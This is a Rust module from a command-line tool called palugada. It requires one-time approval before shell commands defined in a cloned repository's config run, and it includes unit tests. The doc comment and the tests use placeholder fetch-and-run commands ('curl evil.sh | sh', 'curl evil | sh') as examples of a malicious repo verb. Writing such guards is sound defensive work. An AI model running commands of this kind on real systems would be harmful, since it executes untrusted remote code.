//! Trust-on-first-use gate for repo-committed `exec` verbs.
//!
//! Verbs defined in a cloned repo's `.palugada/config.yaml` run via `sh -c`, so
//! a malicious repo could ship `exec: { build: "curl evil.sh | sh" }` and have
//! it execute the moment a developer — or an AI agent — types
//! `palugada exec build`. Verbs that ship WITH palugada (profile-bundled) are
//! trusted; repo-defined ("project"-origin) verbs are gated: shown once,
//! approved, and the approval cached by (repo, verb, exact command) so a later
//! edit to the verb re-prompts.
//!
//! The cache lives at `~/.palugada/exec-trust.json`, is per-machine, and stores
//! the approved command text verbatim (not a hash) so it is human-auditable and
//! change-detection is exact.

use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::io::{IsTerminal as _, Write as _};
use std::path::{Path, PathBuf};

/// Origin tag a "profile"-bundled verb carries (from `exec::merged_verbs`).
pub const SRC_PROFILE: &str = "profile";

#[derive(Serialize, Deserialize, Default)]
struct TrustStore {
    /// key = `"<repo_abs>\0<verb>"`, value = the approved joined command text.
    #[serde(default)]
    approved: BTreeMap<String, String>,
}

fn trust_path() -> PathBuf {
    crate::config::home_dir().join(".palugada").join("exec-trust.json")
}

fn cache_key(repo: &Path, verb: &str) -> String {
    let abs = repo.canonicalize().unwrap_or_else(|_| repo.to_path_buf());
    format!("{}\0{}", abs.to_string_lossy(), verb)
}

fn load_store() -> TrustStore {
    match std::fs::read_to_string(trust_path()) {
        Ok(raw) => serde_json::from_str(&raw).unwrap_or_default(),
        Err(_) => TrustStore::default(),
    }
}

fn save_store(store: &TrustStore) -> Result<(), String> {
    let path = trust_path();
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(|e| format!("create {}: {e}", dir.display()))?;
    }
    let raw = serde_json::to_string_pretty(store).map_err(|e| e.to_string())?;
    std::fs::write(&path, raw).map_err(|e| format!("write {}: {e}", path.display()))
}

/// The three possible verdicts before any prompt/persist. Pure — unit-tested.
#[derive(Debug, PartialEq)]
pub enum TrustState {
    /// Bundled with palugada, or already approved for this exact command.
    AlreadyTrusted,
    /// A non-interactive override (`--yes` / env) approved it; caller persists.
    AutoApproved,
    /// Repo-defined and not yet approved; caller must prompt (if interactive).
    NeedsPrompt,
}

/// Decide trust WITHOUT I/O. `is_profile` = the verb ships with palugada.
/// `cached` = the previously-approved command text for this (repo, verb), if any.
pub fn evaluate(
    is_profile: bool,
    current_cmd: &str,
    cached: Option<&str>,
    force_yes: bool,
) -> TrustState {
    if is_profile || cached == Some(current_cmd) {
        TrustState::AlreadyTrusted
    } else if force_yes {
        TrustState::AutoApproved
    } else {
        TrustState::NeedsPrompt
    }
}

/// True when a repo-defined verb has already been approved for this exact
/// command (no prompt, no persist). Used by `doctor`, which must stay
/// non-interactive.
pub fn is_trusted(repo: &Path, verb: &str, src: &str, joined_cmd: &str) -> bool {
    if src == SRC_PROFILE {
        return true;
    }
    load_store().approved.get(&cache_key(repo, verb)).map(String::as_str) == Some(joined_cmd)
}

/// Gate a verb before it runs. Bundled verbs pass. A repo-defined verb passes
/// only if already approved (unchanged), auto-approved via `force_yes`, or the
/// user approves at an interactive prompt; otherwise `Err` explains how to
/// approve. `force_yes` should fold in the `PALUGADA_TRUST_REPO_EXEC` env var.
pub fn ensure_trusted(
    repo: &Path,
    verb: &str,
    src: &str,
    joined_cmd: &str,
    force_yes: bool,
) -> Result<(), String> {
    let cached = if src == SRC_PROFILE {
        None
    } else {
        load_store().approved.get(&cache_key(repo, verb)).cloned()
    };
    match evaluate(src == SRC_PROFILE, joined_cmd, cached.as_deref(), force_yes) {
        TrustState::AlreadyTrusted => Ok(()),
        TrustState::AutoApproved => persist_approval(repo, verb, joined_cmd),
        TrustState::NeedsPrompt => {
            if std::io::stdin().is_terminal() && std::io::stderr().is_terminal() {
                prompt_and_maybe_approve(repo, verb, joined_cmd)
            } else {
                Err(untrusted_message(verb, joined_cmd))
            }
        }
    }
}

fn persist_approval(repo: &Path, verb: &str, joined_cmd: &str) -> Result<(), String> {
    let mut store = load_store();
    store.approved.insert(cache_key(repo, verb), joined_cmd.to_string());
    save_store(&store)
}

fn prompt_and_maybe_approve(repo: &Path, verb: &str, joined_cmd: &str) -> Result<(), String> {
    eprintln!(
        "\n\u{26a0}  exec verb '{verb}' is defined by THIS REPO (.palugada/config.yaml), not by \
         palugada.\n   It will run in a shell:\n\n     {joined_cmd}\n\n   Only approve if you \
         trust this repository."
    );
    eprint!("   Run it and remember this approval? [y/N] ");
    let _ = std::io::stderr().flush();
    let mut line = String::new();
    std::io::stdin()
        .read_line(&mut line)
        .map_err(|e| format!("read confirmation: {e}"))?;
    let yes = matches!(line.trim().to_ascii_lowercase().as_str(), "y" | "yes");
    if yes {
        persist_approval(repo, verb, joined_cmd)?;
        Ok(())
    } else {
        Err(format!("declined: exec verb '{verb}' was not approved"))
    }
}

fn untrusted_message(verb: &str, joined_cmd: &str) -> String {
    format!(
        "refusing to run repo-defined exec verb '{verb}' without approval (it would run: `{joined_cmd}`).\n\
         This verb comes from the repository's .palugada/config.yaml, not from palugada. Review it, then:\n  \
         • approve interactively: run `palugada exec {verb}` in a terminal, or\n  \
         • pass `--yes`, or\n  \
         • set PALUGADA_TRUST_REPO_EXEC=1 (e.g. in trusted CI)."
    )
}

/// Whether the environment opts into trusting repo exec verbs (CI escape hatch).
pub fn env_trust_optin() -> bool {
    std::env::var("PALUGADA_TRUST_REPO_EXEC").map(|v| v == "1").unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn profile_verbs_are_always_trusted() {
        assert_eq!(evaluate(true, "anything", None, false), TrustState::AlreadyTrusted);
    }

    #[test]
    fn unchanged_approved_command_is_trusted() {
        assert_eq!(
            evaluate(false, "cargo build", Some("cargo build"), false),
            TrustState::AlreadyTrusted
        );
    }

    #[test]
    fn changed_command_needs_prompt_even_if_previously_approved() {
        // A repo edited its verb after approval → the old approval must NOT cover it.
        assert_eq!(
            evaluate(false, "curl evil | sh", Some("cargo build"), false),
            TrustState::NeedsPrompt
        );
    }

    #[test]
    fn new_repo_verb_needs_prompt_but_yes_auto_approves() {
        assert_eq!(evaluate(false, "make", None, false), TrustState::NeedsPrompt);
        assert_eq!(evaluate(false, "make", None, true), TrustState::AutoApproved);
    }

    #[test]
    fn untrusted_message_names_the_verb_and_command() {
        let m = untrusted_message("build", "curl evil | sh");
        assert!(m.contains("build") && m.contains("curl evil | sh"));
        assert!(m.contains("--yes") && m.contains("PALUGADA_TRUST_REPO_EXEC"));
    }
}
